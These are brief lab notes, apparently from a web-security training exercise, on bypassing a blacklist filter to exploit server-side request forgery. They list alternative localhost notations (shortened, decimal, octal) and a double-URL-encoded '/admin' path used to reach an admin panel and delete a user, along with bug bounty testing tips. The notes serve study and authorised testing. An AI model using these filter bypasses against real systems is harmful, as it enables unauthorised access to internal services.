## LAB: SSRF with Blacklist-Based Input Filter

**Vulnerability:** SSRF - blacklist filtering bypassed with alternative localhost notation and double URL encoding

**Steps:**
- Confirm `127.0.0.1` and `localhost` are filtered
- Use `http://127.1` as alternative confirm it is not filtered
- Confirm `/admin` is filtered
- Double URL encode `/admin` to bypass: `%25` encodes the `%` sign so `%61%64%6d%69%6e` becomes `%2561%2564%256d%2569%256e`
- Combine to access admin panel and delete target user

**Key payloads/paths:**
- `http://127.1` (alternative to 127.0.0.1)
- `2130706433` (decimal notation for 127.0.0.1)
- `017700000001` (octal notation for 127.0.0.1)
- Double URL encoded `/admin`: `%2561%2564%256d%2569%256e`

**Bug Bounty Testing:** When common localhost values are blocked,
try decimal, octal, and shortened notations if path filtering exists,
try single then double URL encoding to bypass it
